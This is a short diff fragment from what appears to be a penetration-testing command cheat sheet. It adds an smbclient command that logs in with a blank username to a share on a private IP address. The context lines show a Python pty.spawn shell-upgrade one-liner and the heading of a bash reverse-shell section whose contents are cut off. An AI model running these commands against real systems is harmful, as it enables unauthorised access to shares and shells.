@@ -28,6 +28,10 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 ## More commands - Coming Soon
 
+```
+smbclient -U ' ' \\\\172.16.1.10\\SlackMigration
+```
+
 ### Bash Reverse Shell
 
 ```
